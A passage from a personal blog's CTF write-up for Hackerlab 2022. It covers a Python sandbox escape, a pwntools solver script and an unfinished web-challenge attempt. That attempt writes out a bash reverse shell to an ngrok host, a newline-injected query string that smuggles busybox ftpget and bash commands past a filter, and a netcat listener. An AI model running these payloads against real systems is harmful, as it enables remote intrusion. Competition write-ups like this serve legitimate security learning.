-rwxr-x--- 1 root ecowas   53 Aug  3 20:02 start.sh
0
</code></pre><p>Lol this one is amazing</p>
<pre tabindex="0"><code>&gt;&gt;&gt; print sys.modules[&#39;os&#39;].system(&#39;cat flag.txt&#39;)
Check the source code0
</code></pre><p>I knew It could not be over yet</p>
<pre tabindex="0"><code>&gt;&gt;&gt; print sys.modules[&#39;os&#39;].system(&#39;cat chal.py&#39;) 
...
[REDACTED]
</code></pre><p>I put the mad long output <a href="2022/chal.py">here</a></p>
<p>Big hints: <code>RSA cracking + hex string</code></p>
<p>Trust me..;alot of scripting is involved from here</p>
<p>But to not be too verbose I once again reffer to <a href="https://github.com/TargetRoot/CTF">those awesome guys</a> and their final payload</p>
<pre tabindex="0"><code>from pwn import *
def f (param1):
	local_10=1
	local_14=2
	while local_14&lt;=param1:
		local_10 = local_14 * local_10
		local_14 = local_14 + 1
	return local_10
def D(param1,param2):
	return f(param1)//(f(param2)*f(param1-param2))
def checking (param1):
	d=[]
	for i in range(param1+1):
		d.append(D(param1,i))
	return d
conn=remote(&#39;51.38.37.81&#39;,4003)
a=int(conn.recvline().decode())
print(a)
d=checking(a)
print(len(d))
for i in range(a+1):
	print(d[i])
	conn.sendline(str(d[i]).encode())
print(conn.recvall())
</code></pre><h3 id="final">Final</h3>
<ul>
<li>points = 250</li>
<li>status = unsolved</li>
</ul>
<p>The last one! It&rsquo;s a <a href="http://51.38.37.81:4043/">web challenge!</a></p>
<p>I didnt do it so still according to <a href="https://github.com/TargetRoot/CTF">my G&rsquo;s</a></p>
<p>It was straightforward RCE but&hellip;for RCE you might need a VPS (idk If ngrok)</p>
<pre tabindex="0"><code>└──╼ $pip3 install pyftpdlib

└──╼ $echo &#39;bash -i &gt;&amp; /dev/tcp/tcp://6.tcp.ngrok.io:16211/4444 0&gt;&amp;1&#39; &gt; shell

└──╼ $sudo python -m pyftpdlib -p 21
[I 2022-09-04 15:15:50] concurrency model: async
[I 2022-09-04 15:15:50] masquerade (NAT) address: None
[I 2022-09-04 15:15:50] passive ports: None
[I 2022-09-04 15:15:50] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=8573 &lt;&lt;&lt;

└──╼ $?user_inputs[0]=e&amp;user_inputs[1]=a%0a&amp;user_inputs[2]=busybox&amp;user_inputs[3]=ftpget&amp;user_inputs[4]=51383781&amp;user_inputs[5]=1337
[4] 8906
[5] 8907
[6] 8908
bash: ?user_inputs[0]=e : commande introuvable
[7] 8909
[8] 8910
[3]   Fini                    user_inputs[1]=a%0a
[4]   Termine 127             ?user_inputs[0]=e
[7]-  Fini                    user_inputs[3]=ftpget
[8]+  Fini                    user_inputs[4]=51383781

└──╼ $?user_inputs[0]=e&amp;user_inputs[1]=a%0a&amp;user_inputs[2]=bash&amp;user_inputs[3]=1337
[7] 8912
bash: ?user_inputs[0]=e : commande introuvable
[8] 8913
[9] 8914
[5]   Fini                    user_inputs[1]=a%0a
[6]   Fini                    user_inputs[2]=busybox
[7]   Termine 127             ?user_inputs[0]=e
[8]-  Fini                    user_inputs[1]=a%0a
[9]+  Fini                    user_inputs[2]=bash
</code></pre><p>In the paylaod <code>...[4]=51383781...</code> Is the target IP without the dots (avoid preg_match)</p>
<p>Before running the last command I had my listenner up</p>
<pre tabindex="0"><code>└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 35042
SSH-2.0-ssh2js1.4.0
</code></pre><p>I got a connection but It didnt live. I might update this later but seems it&rsquo;s the last step</p>
<p>You just get the flag after this one</p>
<h2 id="end-of-the-line">END OF THE LINE!</h2>

    <img src="http://localhost:1313/hackerlab2022/scores.png"  alt="my-scores"  class="center"  style="width: 300px;"  />


<p>That was an awesome experience, even though I joined late, I had alot of fun and most importantly learnt alot!</p>
<p>I could see there are alot of talented hackers out there, even just in my country</p>
<p><a href="https://github.com/TargetRoot/CTF/tree/main/Hackerlab2k22">Those Guys</a> were awesome. They almost made it to finals while I was 75th on a total of 220 participating teams (not good not terrible)</p>
<p>So I know there is still alot for me to learn, and that&rsquo;s what I am gonna do</p>
<p>keep learning folks!</p>

            </div>
        </article>

        <hr />

        <div class="post-info">
            
            
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-folder meta-icon"><path d="M22 19a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h5l2 3h9a2 2 0 0 1 2 2z"></path></svg>

        <span class="tag"><a href="http://localhost:1313/categories/hackerlab/">Hackerlab</a></span>
        
    </p>

			    <p><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-git-commit"><circle cx="12" cy="12" r="4"></circle><line x1="1.05" y1="12" x2="7" y2="12"></line><line x1="17.01" y1="12" x2="22.96" y2="12"></line></svg><a href="https://github.com/nair0lf32/zer0ne-blog3ea6cd49a6d64f0d2ae78ea0154477712891a42e" target="_blank" rel="noopener">3ea6cd4</a> @ 2024-01-31</p>
  		</div>
    </main>

            </div>

            
                <footer class="footer">
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2024</span>
            <span><a href="http://localhost:1313/">nair0lf32</a></span>
            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
            <span><a href="http://localhost:1313/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
            
        </div>
    </div>
    
    
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
        </div>
    </div>
    
</footer>

            
        </div>

        



<script type="text/javascript" src="http://localhost:1313/bundle.min.b1dc444a7108174ae3d2294f982be5e99e844ae2b8d58eeea19d929bde0338be4d12ed8a4dfc67194dcc6726fa6a82705119c0d7e4edd4de9294be6535ea7b7f.js" integrity="sha512-sdxESnEIF0rj0ilPmCvl6Z6ESuK41Y7uoZ2Sm94DOL5NEu2KTfxnGU3MZyb6aoJwURnA1&#43;Tt1N6SlL5lNep7fw=="></script>



    </body>
</html>
